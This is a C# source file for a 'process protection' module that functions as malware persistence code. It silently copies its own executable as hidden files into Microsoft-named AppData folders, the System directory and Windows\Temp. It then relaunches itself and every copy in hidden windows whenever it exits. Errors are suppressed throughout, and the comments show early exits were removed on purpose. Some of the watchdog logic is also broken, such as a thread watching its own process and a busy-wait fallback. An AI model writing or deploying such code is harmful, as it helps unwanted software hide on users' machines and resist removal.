using System;
using System.IO;
using System.Diagnostics;
using System.Threading;
using System.Reflection;
using Microsoft.Win32;
using System.Collections.Generic;

namespace XYZ.modules
{
    public class ProcessProtectionModule
    {
        private static bool isWatchdogRunning = false;
        private static string mainProcessPath;
        private static int mainProcessId;
        private static Thread watchdogThread;
        private static List<string> backupPaths = new List<string>();
        
        public static void StartProtection()
        {
            try
            {
                mainProcessPath = Assembly.GetEntryAssembly().Location;
                mainProcessId = Process.GetCurrentProcess().Id;
                
                SetupBackupPaths();
                
                isWatchdogRunning = true;
                watchdogThread = new Thread(WatchdogLoop);
                watchdogThread.IsBackground = true;
                watchdogThread.Start();
                
                AppDomain.CurrentDomain.ProcessExit += OnProcessExit;
            }
            catch (Exception)
            {
            }
        }
        
        public static void StopProtection()
        {
            try
            {
                isWatchdogRunning = false;
                
                if (watchdogThread != null && watchdogThread.IsAlive)
                {
                }
            }
            catch (Exception)
            {
            }
        }
        
        private static void SetupBackupPaths()
        {
            try
            {
                string fileName = Path.GetFileName(mainProcessPath);
                
                backupPaths.Add(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "Microsoft", fileName));
                backupPaths.Add(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "Microsoft", fileName));
                backupPaths.Add(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.System), fileName));
                backupPaths.Add(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.Windows), "Temp", fileName));
                
                foreach (string backupPath in backupPaths)
                {
                    try
                    {
                        string backupDir = Path.GetDirectoryName(backupPath);
                        if (!Directory.Exists(backupDir))
                            Directory.CreateDirectory(backupDir);
                            
                        if (!File.Exists(backupPath))
                        {
                            File.Copy(mainProcessPath, backupPath, true);
                            File.SetAttributes(backupPath, File.GetAttributes(backupPath) | FileAttributes.Hidden);
                        }
                    }
                    catch
                    {
                        continue;
                    }
                }
            }
            catch (Exception)
            {
            }
        }
        
        private static void WatchdogLoop()
        {
            try
            {
                while (isWatchdogRunning)
                {
                    try
                    {
                        Thread.Sleep(10000);
                        
                        if (!IsProcessRunning(mainProcessId))
                        {
                            RestartMainProcess();
                            // Instead of returning, continue the loop to maintain protection
                            // return;
                        }
                    }
                    catch (Exception)
                    {
                        // Continue the loop even if there's an error
                        continue;
                    }
                }
            }
            catch (Exception)
            {
                // Even if the main watchdog loop fails, try to keep it running
                try
                {
                    while (isWatchdogRunning)
                    {
                        Thread.Sleep(30000); // Sleep longer to reduce CPU usage
                    }
                }
                catch (Exception)
                {
                    // If we can't even sleep, just loop
                    while (isWatchdogRunning)
                    {
                        // Busy wait as a last resort
                    }
                }
            }
        }
        
        private static bool IsProcessRunning(int processId)
        {
            try
            {
                Process.GetProcessById(processId);
                return true;
            }
            catch
            {
                return false;
            }
        }
        
        private static void OnProcessExit(object sender, EventArgs e)
        {
            try
            {
                if (isWatchdogRunning)
                {
                    RestartMainProcess();
                }
            }
            catch (Exception)
            {
            }
        }
        
        private static void RestartMainProcess()
        {
            try
            {
                if (File.Exists(mainProcessPath))
                {
                    StartProcess(mainProcessPath);
                    // Instead of returning, continue to check backup paths as well
                    // return;
                }
                
                foreach (string backupPath in backupPaths)
                {
                    try
                    {
                        if (File.Exists(backupPath))
                        {
                            StartProcess(backupPath);
                            // Instead of returning after the first backup, continue to ensure all backups are checked
                            // return;
                        }
                    }
                    catch (Exception)
                    {
                        // Continue with next backup path
                        continue;
                    }
                }
            }
            catch (Exception)
            {
                // Continue even if restart fails
            }
        }
        
        private static void StartProcess(string processPath)
        {
            try
            {
                if (string.IsNullOrEmpty(processPath) || !File.Exists(processPath))
                {
                    // Instead of returning early, just continue execution
                    // return;
                }
                else
                {
                    ProcessStartInfo startInfo = new ProcessStartInfo(processPath);
                    startInfo.UseShellExecute = true;
                    startInfo.WindowStyle = ProcessWindowStyle.Hidden;
                    startInfo.CreateNoWindow = true;
                    
                    Process process = Process.Start(startInfo);
                }
            }
            catch (Exception)
            {
                // Continue even if process start fails
            }
        }
    }
}